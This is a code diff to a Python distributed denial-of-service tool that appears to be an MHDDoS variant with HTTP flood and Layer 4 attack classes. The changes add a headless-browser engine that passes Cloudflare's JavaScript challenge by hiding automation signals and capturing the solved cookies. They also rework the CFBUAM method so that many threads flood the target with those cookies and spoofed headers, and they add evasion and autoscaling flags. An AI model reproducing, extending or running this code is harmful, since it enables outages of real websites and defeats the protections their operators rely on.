@@ -58,6 +58,12 @@ from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, get, cookies
 from yarl import URL
 
+try:
+    from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
+    PLAYWRIGHT_INSTALLED = True
+except ImportError:
+    PLAYWRIGHT_INSTALLED = False
+
 # --- Tactical Configuration (v1.1.3) ---
 __version__: str = "1.1.3"
 __dir__: Path = Path(__file__).parent
@@ -80,6 +86,11 @@ ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
 if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
     ctx.minimum_version = ssl.TLSVersion.TLSv1_2
+# Disable insecure TLS versions for additional safety (defense-in-depth)
+if hasattr(ssl, "OP_NO_TLSv1"):
+    ctx.options |= ssl.OP_NO_TLSv1
+if hasattr(ssl, "OP_NO_TLSv1_1"):
+    ctx.options |= ssl.OP_NO_TLSv1_1
 
 __ip__: Any = None
 tor2webs = [
@@ -152,10 +163,11 @@ class IntelligenceDB:
     def __init__(self, db_path: str = "files/intelligence.db"):
         self.db_path = __dir__ / db_path
         self.db_path.parent.mkdir(parents=True, exist_ok=True)
+        self.lock = Lock()
         self._init_db()
 
     def _init_db(self):
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30.0) as conn:
             cursor = conn.cursor()
             cursor.execute('''
                 CREATE TABLE IF NOT EXISTS proxy_intel (
@@ -169,28 +181,30 @@ class IntelligenceDB:
             conn.commit()
 
     def update_proxy_scores(self, proxies: List['TacticalProxy']):
-        with sqlite3.connect(self.db_path) as conn:
-            cursor = conn.cursor()
-            now = datetime.now()
-            for p in proxies:
-                cursor.execute('''
-                    INSERT INTO proxy_intel (ip_port, latency, score, failures, last_seen)
-                    VALUES (?, ?, ?, ?, ?)
-                    ON CONFLICT(ip_port) DO UPDATE SET
-                        latency=excluded.latency,
-                        score=excluded.score,
-                        failures=failures + excluded.failures,
-                        last_seen=excluded.last_seen
-                ''', (str(p.base), p.latency_ms, p.score, p.fail_count, now))
-            conn.commit()
+        with self.lock:
+            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
+                cursor = conn.cursor()
+                now = datetime.now().isoformat()
+                for p in proxies:
+                    cursor.execute('''
+                        INSERT INTO proxy_intel (ip_port, latency, score, failures, last_seen)
+                        VALUES (?, ?, ?, ?, ?)
+                        ON CONFLICT(ip_port) DO UPDATE SET
+                            latency=excluded.latency,
+                            score=excluded.score,
+                            failures=failures + excluded.failures,
+                            last_seen=excluded.last_seen
+                    ''', (str(p.base), p.latency_ms, p.score, p.fail_count, now))
+                conn.commit()
 
     def get_proxy_intel(self, ip_port: str) -> Optional[Dict]:
-        with sqlite3.connect(self.db_path) as conn:
-            cursor = conn.cursor()
-            cursor.execute('SELECT latency, score, failures FROM proxy_intel WHERE ip_port=?', (ip_port,))
-            row = cursor.fetchone()
-            if row:
-                return {'latency': row[0], 'score': row[1], 'failures': row[2]}
+        with self.lock:
+            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
+                cursor = conn.cursor()
+                cursor.execute('SELECT latency, score, failures FROM proxy_intel WHERE ip_port=?', (ip_port,))
+                row = cursor.fetchone()
+                if row:
+                    return {'latency': row[0], 'score': row[1], 'failures': row[2]}
         return None
 
 INTEL_DB = IntelligenceDB()
@@ -806,6 +820,84 @@ class Tools:
             sock.close()
 
 
+class BrowserEngine:
+    """Advanced Browser Fingerprinting Engine for bypassing JS/Captcha challenges"""
+    
+    @staticmethod
+    def solve_cf(url: str, proxy: str = None, timeout: int = 15000):
+        if not PLAYWRIGHT_INSTALLED:
+            logger.error("[!] Playwright is not installed. CFBUAM requires playwright. Run: pip install playwright && playwright install chromium")
+            return None, None
+            
+        logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Initializing headless browser for {url}...{bcolors.RESET}")
+        
+        try:
+            with sync_playwright() as p:
+                launch_args = {
+                    "headless": True,
+                    "args": [
+                        "--disable-blink-features=AutomationControlled",
+                        "--disable-infobars",
+                        "--no-sandbox",
+                        "--disable-setuid-sandbox",
+                        "--ignore-certificate-errors",
+                        "--disable-extensions"
+                    ]
+                }
+                
+                if proxy:
+                    proxy_url = f"http://{proxy}" if not "://" in proxy else proxy
+                    launch_args["proxy"] = {"server": proxy_url}
+                    
+                browser = p.chromium.launch(**launch_args)
+                
+                # Create a stealthy context
+                context = browser.new_context(
+                    viewport={'width': 1920, 'height': 1080},
+                    user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                    locale='en-US',
+                    timezone_id='America/New_York'
+                )
+                
+                # Mock webdriver to False to bypass detection
+                context.add_init_script("""
+                    Object.defineProperty(navigator, 'webdriver', {
+                        get: () => undefined
+                    });
+                """)
+                
+                page = context.new_page()
+                page.set_default_timeout(timeout)
+                
+                logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Navigating and solving challenges...{bcolors.RESET}")
+                
+                # Wait until network is mostly idle (indicates challenge passed and page loaded)
+                response = page.goto(url, wait_until="networkidle")
+                
+                # If still stuck on challenge, wait a bit longer for JS to execute
+                if "Just a moment" in page.title() or "Attention Required" in page.title():
+                    logger.info(f"{bcolors.WARNING}[*] Headless Recon: Waiting for JS challenge verification...{bcolors.RESET}")
+                    try:
+                        page.wait_for_selector("text=Just a moment", state="hidden", timeout=10000)
+                    except PlaywrightTimeoutError:
+                        pass
+                
+                title = page.title()
+                logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Navigation complete. Page Title: {title}{bcolors.RESET}")
+                
+                # Extract solved cookies and user-agent
+                cookies_list = context.cookies()
+                cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies_list])
+                ua = page.evaluate("navigator.userAgent")
+                
+                browser.close()
+                return cookie_str, ua
+                
+        except Exception as e:
+            logger.error(f"{bcolors.FAIL}[!] Headless Recon Failed: {e}{bcolors.RESET}")
+            return None, None
+
+
 class Minecraft:
     @staticmethod
     def varint(d: int) -> bytes:
@@ -1290,6 +1382,10 @@ class Layer4(Thread):
 
 class HttpFlood(Thread):
     _proxy_pool: TacticalProxyPool = None
+    _cfbuam_cookie: str = None
+    _cfbuam_ua: str = None
+    _cfbuam_lock = Lock()
+    
     _payload: str
     _defaultpayload: Any
     _req_type: str
@@ -1747,16 +1843,41 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def CFBUAM(self) -> None:
-        payload = self.generate_payload()
+        """
+        Cloudflare UAM Bypass using Headless Browser.
+        Solves the JS challenge once globally, then all threads use the synced cookies.
+        """
+        if not HttpFlood._cfbuam_cookie:
+            with HttpFlood._cfbuam_lock:
+                if not HttpFlood._cfbuam_cookie: # Double-checked locking
+                    proxy_str = str(self._proxy_pool.get_proxy()) if self._proxy_pool else None
+                    cookie, ua = BrowserEngine.solve_cf(str(self._target), proxy=proxy_str)
+                    if cookie:
+                        HttpFlood._cfbuam_cookie = cookie
+                        if ua: HttpFlood._cfbuam_ua = ua
+                    else:
+                        HttpFlood._cfbuam_cookie = "_yummy=choco" # Fallback
+
+        req = (
+            self._payload
+            + f"Host: {self._target.authority}\r\n"
+            + f"Cookie: {HttpFlood._cfbuam_cookie}\r\n"
+        )
+        
+        # Override UA if we got one from browser, else use the evasion/randomized one
+        if HttpFlood._cfbuam_ua:
+            req += f"User-Agent: {HttpFlood._cfbuam_ua}\r\n"
+            req += f"Referer: {self._target.human_repr()}\r\n"
+            req += self.SpoofIP
+        else:
+            req += self.randHeadercontent
+
+        req += "\r\n"
+
         s = None
         with suppress(Exception), self.open_connection() as s:
-            Tools.send(s, payload)
-            sleep(5.01)
-            ts = time()
             for _ in range(self._rpc):
-                Tools.send(s, payload)
-                if time() > ts + 120:
-                    break
+                Tools.send(s, str.encode(req))
         Tools.safe_close(s)
 
     def AVB(self) -> None:
@@ -1896,7 +2017,7 @@ class HttpFlood(Thread):
             "Pragma: no-cache\r\n"
             "Upgrade-Insecure-Requests: 1\r\n\r\n"
         )
-        hexh = r"\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\EA "
+        hexh = r"\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA "
         p1, p2 = (
             str.encode(
                 "%s %s/%s HTTP/1.1\r\nHost: %s/%s\r\n%s%s"
@@ -2348,10 +2469,8 @@ def handleProxyList(con, proxy_arg, proxy_ty, url=None):
                 logger.warning(f"{bcolors.WARNING}[!] Resource: Tactical failure - No active resources found at origin.{bcolors.RESET}")
             else:
                 logger.info(f"{bcolors.OKGREEN}[*] Resource: Deployment successful. {len(proxies):,} active endpoints synchronized.{bcolors.RESET}")
-            sys.stdout.flush()
         except Exception as e:
             logger.error(f"[!] Handshake Failed: {e}")
-            sys.stdout.flush()
             if "ReloadSentinel" not in current_thread().name:
                 exit(f"Origin Unreachable: {e}")
             return set()
@@ -2448,8 +2567,16 @@ if __name__ == "__main__":
                     int(argv[6]),
                     int(argv[7]),
                 )
-                if len(argv) >= 9 and argv[8].isdigit():
-                    refresh_mins = int(argv[8])
+                
+                # Global Flag Detection
+                for arg in argv[8:]:
+                    if arg.isdigit():
+                        refresh_mins = int(arg)
+                    elif arg == "--autoscale":
+                        ENGINE_STATE.active_threads_target.value = threads
+                    elif arg == "--evasion":
+                        pass # Detected via argv check in HttpFlood.run()
+
                 proxy_li = (
                     proxy_arg
                     if proxy_arg.startswith("http")
@@ -2528,9 +2655,17 @@ if __name__ == "__main__":
                 ):
                     exit("Raw Socket Privilege Required")
                 threads, timer, ref = int(argv[3]), int(argv[4]), None
+                
+                # Dynamic Flag Detection for L4
+                for arg in argv[5:]:
+                    if arg == "--autoscale":
+                        ENGINE_STATE.active_threads_target.value = threads
+                    elif arg == "--evasion":
+                        pass
+
                 if len(argv) >= 6:
                     argfive = argv[5].strip()
-                    if argfive:
+                    if argfive and not argfive.startswith("--"):
                         refl_li = Path(__dir__ / "files" / argfive)
                         if method in {
                             "NTP",
@@ -2596,7 +2731,7 @@ if __name__ == "__main__":
                 logger.info(f"{bcolors.OKBLUE}[*] Tactical Engine: Deploying {threads:,} L4 worker threads...{bcolors.RESET}")
                 for thread_id in range(threads):
                     Layer4(
-                        thread_id, (host, port), ref, method, event, proxy_pool, protocolid
+                        (host, port), ref, method, event, proxy_pool, protocolid
                     ).start()
 
             logger.info(
